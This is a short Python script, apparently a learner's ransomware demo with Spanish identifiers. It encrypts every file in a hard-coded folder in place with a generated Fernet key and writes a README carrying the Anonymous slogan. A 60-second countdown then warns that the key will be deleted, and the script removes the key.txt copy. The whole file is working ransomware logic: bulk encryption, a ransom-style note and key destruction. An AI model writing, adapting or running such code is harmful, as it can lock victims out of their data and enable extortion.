from cryptography.fernet import Fernet
import os
import time

def generar_key():
    key = Fernet.generate_key()
    with open('key.key','wb') as key_file:
        key_file.write(key)
    with open('key.txt','wb') as key_file:
        key_file.write(key)

def cargar_key():
    return open('key.key','rb').read()

def encrypt(items,key):
    f = Fernet(key)
    for item in items:
        with open(item,'rb') as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(item, 'wb') as file:
            file.write(encrypted_data)

if __name__ == '__main__':    
    path_to_encrypt = '/home/anon23/Descargas/RansomWare/Files/'
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt + '/' + item for item in items]
    generar_key()
    key = cargar_key()
    encrypt(full_path,key)

    with open(path_to_encrypt+'/README.txt','w') as file:
        file.write('We are Anonymous, we are legion,\n')
        file.write('we do not forgive, we do not forget. Expect us.')
    
    segundos = 0
    while segundos<=60:
        start = time.time()  
        print(str(segundos))   
        print('Tiene 60 segundos para guardar su llave, esta será eliminada')
        end = time.time()
        segundos = segundos + (end-start)
    path_key = '/home/anon23/Descargas/RansomWare'
    if os.path.exists(path_key + '/key.txt'):
        os.remove(path_key + '/key.txt')
    